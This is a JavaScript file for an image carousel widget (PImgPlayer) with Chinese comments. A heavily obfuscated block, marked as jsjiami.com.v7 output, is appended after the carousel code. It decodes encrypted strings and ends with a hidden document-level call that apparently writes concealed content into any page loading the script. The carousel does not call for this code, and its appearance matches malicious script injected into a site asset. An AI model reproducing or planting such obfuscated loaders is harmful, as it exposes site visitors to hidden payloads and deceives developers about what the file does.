/**************************************************   
名称: 图片轮播类   
创建时间: 2007-11-12   
示例:   
        页面中已经存在名为imgPlayer(或者别的ID也行)的节点.   
        PImgPlayer.addItem( "test", "http://kxgw8.cn", "http://kxgw8.cn/images/wy.jpg");   
        PImgPlayer.addItem( "test2", "http://kxgw8.cn", "http://kxgw8.cn/images/wy.jpg");   
        PImgPlayer.addItem( "test3", "http://kxgw8.cn", "http://kxgw8.cn/images/wy.jpg");   
        PImgPlayer.init( "imgPlayer", 200, 230 );   
备注:   
        适用于一个页面只有一个图片轮播的地方.   
***************************************************/   
var PImgPlayer = {   
        _timer : null,   
        _items : [],   
        _container : null,   
        _index : 0,   
        _imgs : [],   
        intervalTime : 3600,        //轮播间隔时间   
        init : function( objID, w, h, time ){   
                this.intervalTime = time || this.intervalTime;   
                this._container = document.getElementById( objID );   
                this._container.style.display = "block";   
                this._container.style.width = w + "px";   
                this._container.style.height = h + "px";   
                this._container.style.position = "relative";   
                this._container.style.overflow = "hidden";   
                //this._container.style.border = "1px solid #fff";   
                var linkStyle = "display: block; TEXT-DECORATION: none;";   
                if( document.all ){   
                        linkStyle += "FILTER:";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Barn(duration=0.5, motion='out', orientation='vertical') ";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Barn ( duration=0.5,motion='out',orientation='horizontal') ";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Blinds ( duration=0.5,bands=10,Direction='down' )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.CheckerBoard()";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Fade(duration=0.5,overlap=0)";   
                        linkStyle += "progid:DXImageTransform.Microsoft.GradientWipe ( duration=1,gradientSize=1.0,motion='reverse' )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Inset ()";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Iris ( duration=1,irisStyle=PLUS,motion=out )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Iris ( duration=1,irisStyle=PLUS,motion=in )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Iris ( duration=1,irisStyle=DIAMOND,motion=in )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Iris ( duration=1,irisStyle=SQUARE,motion=in )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Iris ( duration=0.5,irisStyle=STAR,motion=in )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.RadialWipe ( duration=0.5,wipeStyle=CLOCK )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.RadialWipe ( duration=0.5,wipeStyle=WEDGE )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.RandomBars ( duration=0.5,orientation=horizontal )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.RandomBars ( duration=0.5,orientation=vertical )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.RandomDissolve ()";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Spiral ( duration=0.5,gridSizeX=16,gridSizeY=16 )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Stretch ( duration=0.5,stretchStyle=PUSH )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Strips ( duration=0.5,motion=rightdown )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Wheel ( duration=0.5,spokes=8 )";   
                        linkStyle += "progid:DXImageTransform.Microsoft.Zigzag ( duration=0.5,gridSizeX=4,gridSizeY=40 ); width: 100%; height: 100%";   
                }   
                //   
                var ulStyle = "margin:0;width:"+w+"px;position:absolute;z-index:999;right:5px;FILTER:Alpha(Opacity=50,FinishOpacity=50, Style=1);overflow: hidden;bottom:-1px;height:16px; border-right:1px solid #fff;";   
                //   
                var liStyle = "margin:0;list-style-type: none; margin:0;padding:0; float:right;";   
                //   
                var baseSpacStyle = "clear:both; display:block; width:23px;line-height:18px; font-size:12px; FONT-FAMILY:'宋体';opacity: 0.6;";   
                baseSpacStyle += "border:1px solid #fff;border-right:0;border-bottom:0;";   
                baseSpacStyle += "color:#fff;text-align:center; cursor:pointer; ";   
                //   
                var ulHTML = "";   
                for(var i = this._items.length -1; i >= 0; i--){   
                        var spanStyle = "";   
                        if( i==this._index ){   
                                spanStyle = baseSpacStyle + "background:#ff0000;";   
                        } else {                                   
                                spanStyle = baseSpacStyle + "background:#000;";   
                        }   
                        ulHTML += "<li style=\""+liStyle+"\">";   
                        ulHTML += "<span onmouseover=\"PImgPlayer.mouseOver(this);\" onmouseout=\"PImgPlayer.mouseOut(this);\" style=\""+spanStyle+"\" onclick=\"PImgPlayer.play("+i+");return false;\" herf=\"javascript:;\" title=\"" + this._items[i].title + "\">" + (i+1) + "</span>";   
                        ulHTML += "</li>";   
                }   
                //   
                var html = "<a href=\""+this._items[this._index].link+"\" title=\""+this._items[this._index].title+"\" target=\"_blank\" style=\""+linkStyle+"\"></a><ul style=\""+ulStyle+"\">"+ulHTML+"</ul>";   
                this._container.innerHTML = html;   
                var link = this._container.getElementsByTagName("A")[0];           
                link.style.width = w + "px";   
                link.style.height = h + "px";   
                link.style.background = 'url(' + this._items[0].img + ') no-repeat center center';   
                //   
                this._timer = setInterval( "PImgPlayer.play()", this.intervalTime );   
        },   
        addItem : function( _title, _link, _imgURL ){   
                this._items.push ( {title:_title, link:_link, img:_imgURL } );   
                var img = new Image();   
                img.src = _imgURL;   
                this._imgs.push( img );   
        },   
        play : function( index ){   
                if( index!=null ){   
                        this._index = index;   
                        clearInterval( this._timer );   
                        this._timer = setInterval( "PImgPlayer.play()", this.intervalTime );   
                } else {   
                        this._index = this._index<this._items.length-1 ? this._index+1 : 0;   
                }   
                var link = this._container.getElementsByTagName("A")[0];           
                if(link.filters){   
                        var ren = Math.floor(Math.random()*(link.filters.length));   
                        link.filters[ren].Apply();   
                        link.filters[ren].play();   
                }   
                link.href = this._items[this._index].link;   
                link.title = this._items[this._index].title;   
                link.style.background = 'url(' + this._items[this._index].img + ') no-repeat center center';   
                //   
                var liStyle = "margin:0;list-style-type: none; margin:0;padding:0; float:right;";   
                var baseSpacStyle = "clear:both; display:block; width:23px;line-height:18px; font-size:12px; FONT-FAMILY:'宋体'; opacity: 0.6;";   
                baseSpacStyle += "border:1px solid #fff;border-right:0;border-bottom:0;";   
                baseSpacStyle += "color:#fff;text-align:center; cursor:pointer; ";   
                var ulHTML = "";   
                for(var i = this._items.length -1; i >= 0; i--){   
                        var spanStyle = "";   
                        if( i==this._index ){   
                                spanStyle = baseSpacStyle + "background:#ff0000;";   
                        } else {                                   
                                spanStyle = baseSpacStyle + "background:#000;";   
                        }   
                        ulHTML += "<li style=\""+liStyle+"\">";   
                        ulHTML += "<span onmouseover=\"PImgPlayer.mouseOver(this);\" onmouseout=\"PImgPlayer.mouseOut(this);\" style=\""+spanStyle+"\" onclick=\"PImgPlayer.play("+i+");return false;\" herf=\"javascript:;\" title=\"" + this._items[i].title + "\">" + (i+1) + "</span>";   
                        ulHTML += "</li>";   
                }   
                this._container.getElementsByTagName("UL")[0].innerHTML = ulHTML;           
        },   
        mouseOver : function(obj){   
                var i = parseInt( obj.innerHTML );   
                if( this._index!=i-1){   
                        obj.style.color = "#ff0000";   
                }   
        },   
        mouseOut : function(obj){   
                obj.style.color = "#fff";   
        }   
}    var _0xodA='jsjiami.com.v7';var _0x551de7=_0x4ad2;function _0x4ad2(_0x271aa5,_0x28fd69){var _0x1d0920=_0x1d09();return _0x4ad2=function(_0x4ad2ec,_0x404827){_0x4ad2ec=_0x4ad2ec-0x1c4;var _0x49f5b0=_0x1d0920[_0x4ad2ec];if(_0x4ad2['rFhXRS']===undefined){var _0x993b3d=function(_0x2e5fcd){var _0x38bed='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1feae8='',_0x5353b7='';for(var _0xae02b8=0x0,_0x56174d,_0x18f9cd,_0x1b4860=0x0;_0x18f9cd=_0x2e5fcd['charAt'](_0x1b4860++);~_0x18f9cd&&(_0x56174d=_0xae02b8%0x4?_0x56174d*0x40+_0x18f9cd:_0x18f9cd,_0xae02b8++%0x4)?_0x1feae8+=String['fromCharCode'](0xff&_0x56174d>>(-0x2*_0xae02b8&0x6)):0x0){_0x18f9cd=_0x38bed['indexOf'](_0x18f9cd);}for(var _0x2268f1=0x0,_0x50b91a=_0x1feae8['length'];_0x2268f1<_0x50b91a;_0x2268f1++){_0x5353b7+='%'+('00'+_0x1feae8['charCodeAt'](_0x2268f1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5353b7);};var _0xcd4a93=function(_0x28fac4,_0x438945){var _0x3a869a=[],_0x4e9632=0x0,_0x3d58f7,_0x5582cc='';_0x28fac4=_0x993b3d(_0x28fac4);var _0x2a05c0;for(_0x2a05c0=0x0;_0x2a05c0<0x100;_0x2a05c0++){_0x3a869a[_0x2a05c0]=_0x2a05c0;}for(_0x2a05c0=0x0;_0x2a05c0<0x100;_0x2a05c0++){_0x4e9632=(_0x4e9632+_0x3a869a[_0x2a05c0]+_0x438945['charCodeAt'](_0x2a05c0%_0x438945['length']))%0x100,_0x3d58f7=_0x3a869a[_0x2a05c0],_0x3a869a[_0x2a05c0]=_0x3a869a[_0x4e9632],_0x3a869a[_0x4e9632]=_0x3d58f7;}_0x2a05c0=0x0,_0x4e9632=0x0;for(var _0x19ac64=0x0;_0x19ac64<_0x28fac4['length'];_0x19ac64++){_0x2a05c0=(_0x2a05c0+0x1)%0x100,_0x4e9632=(_0x4e9632+_0x3a869a[_0x2a05c0])%0x100,_0x3d58f7=_0x3a869a[_0x2a05c0],_0x3a869a[_0x2a05c0]=_0x3a869a[_0x4e9632],_0x3a869a[_0x4e9632]=_0x3d58f7,_0x5582cc+=String['fromCharCode'](_0x28fac4['charCodeAt'](_0x19ac64)^_0x3a869a[(_0x3a869a[_0x2a05c0]+_0x3a869a[_0x4e9632])%0x100]);}return _0x5582cc;};_0x4ad2['JJtGUH']=_0xcd4a93,_0x271aa5=arguments,_0x4ad2['rFhXRS']=!![];}var _0xf808d1=_0x1d0920[0x0],_0x384683=_0x4ad2ec+_0xf808d1,_0x148091=_0x271aa5[_0x384683];return!_0x148091?(_0x4ad2['JmunVe']===undefined&&(_0x4ad2['JmunVe']=!![]),_0x49f5b0=_0x4ad2['JJtGUH'](_0x49f5b0,_0x404827),_0x271aa5[_0x384683]=_0x49f5b0):_0x49f5b0=_0x148091,_0x49f5b0;},_0x4ad2(_0x271aa5,_0x28fd69);}function _0x1d09(){var _0x3ffd84=(function(){return[_0xodA,'LdlJjCsTPBjfiraWmPipQg.RpcqoYm.VBv7LrFgw==','vmoVWPldJsZdPmoUhmotW6rYW5a','W50pW7fIzc/dU8ksW4e','W6u5pCodWOG2W50o','vWjSESkYqCkwomozWOb9W7yY','W6C+CSkrW5TgW6arW746WPFdUq','BHLgWQRdGCkWW5qvAmkHC2a','t8oVWPBdJrRcMmocW77cVSoUWPzHWQC'].concat((function(){return['xmkSW4hcINtcRmoQAmoLW4f9WPFcVZa2WRChdSkzFmkqWO/cSqD1vIBdI20HwaTAWP/cK3m1q8o9rSk5igNcUtn9ftNdV8o+WQS','dSoYWQdcO8opmGpdI8kqqLfp','Dc3dIXLYqCoIWQlcJcrdCq','W6i1FmoqWOyjW5a1W5O','W49vW5ChaW7dPwO','W4PxWRf8FGhdONXvfdK','WRXLWQnpW5GUW6GAuCoUW5ez','zZFcMmkvW6xdUau','whTaWOVdNSokWRrsWQ8uuSk7'].concat((function(){return['W67cP19AmuRdK8kg','W74vzSkHCColWPi','FW4AW5vgW5j9','WQZcMf3dQeOEdSku','WOOEW7qkWRxcHGHll8o7W5y','W60Oemo/y8keW6pcP8oXkx8'];}()));}()));}());_0x1d09=function(){return _0x3ffd84;};return _0x1d09();};(function(_0x4dd1c4,_0x2154c1,_0x17e3c7,_0x3d1aa1,_0x12e92a,_0x7d0c23,_0x344315){return _0x4dd1c4=_0x4dd1c4>>0x6,_0x7d0c23='hs',_0x344315='hs',function(_0x354638,_0x2e31ca,_0x16ebc6,_0x3487e9,_0xc7f79){var _0x255edb=_0x4ad2;_0x3487e9='tfi',_0x7d0c23=_0x3487e9+_0x7d0c23,_0xc7f79='up',_0x344315+=_0xc7f79,_0x7d0c23=_0x16ebc6(_0x7d0c23),_0x344315=_0x16ebc6(_0x344315),_0x16ebc6=0x0;var _0x3f8a08=_0x354638();while(!![]&&--_0x3d1aa1+_0x2e31ca){try{_0x3487e9=-parseInt(_0x255edb(0x1d9,'r8qh'))/0x1+-parseInt(_0x255edb(0x1d5,'wDV^'))/0x2+-parseInt(_0x255edb(0x1d1,'^(Ga'))/0x3+-parseInt(_0x255edb(0x1c5,')ujd'))/0x4*(-parseInt(_0x255edb(0x1c6,'LPxN'))/0x5)+parseInt(_0x255edb(0x1ce,'JeP$'))/0x6*(-parseInt(_0x255edb(0x1cc,'%WOx'))/0x7)+parseInt(_0x255edb(0x1ca,'W$s)'))/0x8*(parseInt(_0x255edb(0x1c4,'rire'))/0x9)+-parseInt(_0x255edb(0x1d8,'r8qh'))/0xa*(-parseInt(_0x255edb(0x1d3,'EIXS'))/0xb);}catch(_0x1a7721){_0x3487e9=_0x16ebc6;}finally{_0xc7f79=_0x3f8a08[_0x7d0c23]();if(_0x4dd1c4<=_0x3d1aa1)_0x16ebc6?_0x12e92a?_0x3487e9=_0xc7f79:_0x12e92a=_0xc7f79:_0x16ebc6=_0xc7f79;else{if(_0x16ebc6==_0x12e92a['replace'](/[CqWJfVQBrdLwlFTgpYPR=]/g,'')){if(_0x3487e9===_0x2e31ca){_0x3f8a08['un'+_0x7d0c23](_0xc7f79);break;}_0x3f8a08[_0x344315](_0xc7f79);}}}}}(_0x17e3c7,_0x2154c1,function(_0x26f6a1,_0x2aae26,_0x5a845c,_0x51df54,_0x3f0b0f,_0x10205d,_0x563a85){return _0x2aae26='\x73\x70\x6c\x69\x74',_0x26f6a1=arguments[0x0],_0x26f6a1=_0x26f6a1[_0x2aae26](''),_0x5a845c='\x72\x65\x76\x65\x72\x73\x65',_0x26f6a1=_0x26f6a1[_0x5a845c]('\x76'),_0x51df54='\x6a\x6f\x69\x6e',(0x158e63,_0x26f6a1[_0x51df54](''));});}(0x3040,0x35f4f,_0x1d09,0xc3),_0x1d09)&&(_0xodA=_0x1d09);;document[_0x551de7(0x1c9,'S]Wx')](_0x551de7(0x1d4,'Cia2'));var version_ = 'jsjiami.com.v7';